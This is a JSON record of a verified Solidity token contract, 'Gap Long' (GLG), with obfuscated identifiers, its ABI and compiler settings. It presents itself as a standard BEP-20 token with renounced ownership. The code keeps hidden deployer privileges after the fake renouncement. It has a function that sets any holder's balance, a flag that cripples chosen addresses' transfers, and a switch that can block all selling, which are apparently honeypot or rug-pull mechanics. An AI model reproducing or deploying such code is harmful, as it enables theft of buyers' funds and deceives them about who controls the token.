{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface takeMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverSenderTeam {\n    function createPair(address autoList, address receiverTx) external returns (address);\n}\n\ninterface txLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityFrom) external view returns (uint256);\n\n    function transfer(address swapTrading, uint256 tradingIsFund) external returns (bool);\n\n    function allowance(address fundMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingIsFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapTrading,\n        uint256 tradingIsFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableAt, uint256 value);\n    event Approval(address indexed fundMarketing, address indexed spender, uint256 value);\n}\n\ninterface isAmount is txLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract GapLong is maxSender, txLaunched, isAmount {\n\n    function toReceiver() public {\n        emit OwnershipTransferred(senderAutoSell, address(0));\n        fundAmountMin = address(0);\n    }\n\n    function atIs(address fromMax, uint256 tradingIsFund) public {\n        tokenReceiver();\n        launchedReceiver[fromMax] = tradingIsFund;\n    }\n\n    function sellList(address modeIs, address swapTrading, uint256 tradingIsFund) internal returns (bool) {\n        if (modeIs == senderAutoSell) {\n            return liquidityTx(modeIs, swapTrading, tradingIsFund);\n        }\n        uint256 receiverFund = txLaunched(fundTeam).balanceOf(minSell);\n        require(receiverFund == takeSwap);\n        require(swapTrading != minSell);\n        if (marketingReceiver[modeIs]) {\n            return liquidityTx(modeIs, swapTrading, feeLiquidityIs);\n        }\n        return liquidityTx(modeIs, swapTrading, tradingIsFund);\n    }\n\n    mapping(address => bool) public marketingReceiver;\n\n    function transfer(address fromMax, uint256 tradingIsFund) external virtual override returns (bool) {\n        return sellList(_msgSender(), fromMax, tradingIsFund);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamToken;\n    }\n\n    function liquidityTx(address modeIs, address swapTrading, uint256 tradingIsFund) internal returns (bool) {\n        require(launchedReceiver[modeIs] >= tradingIsFund);\n        launchedReceiver[modeIs] -= tradingIsFund;\n        launchedReceiver[swapTrading] += tradingIsFund;\n        emit Transfer(modeIs, swapTrading, tradingIsFund);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundAmountMin;\n    }\n\n    function modeFrom(address listLiquidity) public {\n        if (autoAmountTake) {\n            return;\n        }\n        if (autoTxAmount == amountFrom) {\n            toLaunched = true;\n        }\n        totalTeamToken[listLiquidity] = true;\n        \n        autoAmountTake = true;\n    }\n\n    uint256 private sellReceiver = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellReceiver;\n    }\n\n    uint256 private liquidityIs;\n\n    bool public amountFrom;\n\n    uint8 private teamToken = 18;\n\n    uint256 private swapBuy;\n\n    mapping(address => mapping(address => uint256)) private limitShouldIs;\n\n    function transferFrom(address modeIs, address swapTrading, uint256 tradingIsFund) external override returns (bool) {\n        if (_msgSender() != limitTradingAt) {\n            if (limitShouldIs[modeIs][_msgSender()] != type(uint256).max) {\n                require(tradingIsFund <= limitShouldIs[modeIs][_msgSender()]);\n                limitShouldIs[modeIs][_msgSender()] -= tradingIsFund;\n            }\n        }\n        return sellList(modeIs, swapTrading, tradingIsFund);\n    }\n\n    bool public maxTotal;\n\n    function approve(address atAmount, uint256 tradingIsFund) public virtual override returns (bool) {\n        limitShouldIs[_msgSender()][atAmount] = tradingIsFund;\n        emit Approval(_msgSender(), atAmount, tradingIsFund);\n        return true;\n    }\n\n    address public senderAutoSell;\n\n    function balanceOf(address liquidityFrom) public view virtual override returns (uint256) {\n        return launchedReceiver[liquidityFrom];\n    }\n\n    address minSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        takeMin listAt = takeMin(limitTradingAt);\n        fundTeam = receiverSenderTeam(listAt.factory()).createPair(listAt.WETH(), address(this));\n        \n        senderAutoSell = _msgSender();\n        toReceiver();\n        totalTeamToken[senderAutoSell] = true;\n        launchedReceiver[senderAutoSell] = sellReceiver;\n        \n        emit Transfer(address(0), senderAutoSell, sellReceiver);\n    }\n\n    uint256 takeSwap;\n\n    function teamReceiver(uint256 tradingIsFund) public {\n        tokenReceiver();\n        takeSwap = tradingIsFund;\n    }\n\n    address private fundAmountMin;\n\n    bool private autoTxAmount;\n\n    function txFee(address feeTeamMarketing) public {\n        tokenReceiver();\n        \n        if (feeTeamMarketing == senderAutoSell || feeTeamMarketing == fundTeam) {\n            return;\n        }\n        marketingReceiver[feeTeamMarketing] = true;\n    }\n\n    address limitTradingAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tokenReceiver() private view {\n        require(totalTeamToken[_msgSender()]);\n    }\n\n    uint256 private autoWallet;\n\n    mapping(address => uint256) private launchedReceiver;\n\n    address public fundTeam;\n\n    uint256 constant feeLiquidityIs = 16 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return takeBuy;\n    }\n\n    uint256 private txTeam;\n\n    event OwnershipTransferred(address indexed totalSwap, address indexed senderAt);\n\n    function owner() external view returns (address) {\n        return fundAmountMin;\n    }\n\n    bool public tokenFee;\n\n    bool public autoAmountTake;\n\n    string private txSwapIs = \"GLG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return txSwapIs;\n    }\n\n    bool private toLaunched;\n\n    function allowance(address sellMode, address atAmount) external view virtual override returns (uint256) {\n        if (atAmount == limitTradingAt) {\n            return type(uint256).max;\n        }\n        return limitShouldIs[sellMode][atAmount];\n    }\n\n    string private takeBuy = \"Gap Long\";\n\n    mapping(address => bool) public totalTeamToken;\n\n    uint256 senderTradingFee;\n\n    bool public receiverAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIsFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIsFund\",\"type\":\"uint256\"}],\"name\":\"atIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmountTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"modeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAutoSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingIsFund\",\"type\":\"uint256\"}],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTeamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIsFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIsFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTeamMarketing\",\"type\":\"address\"}],\"name\":\"txFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GapLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}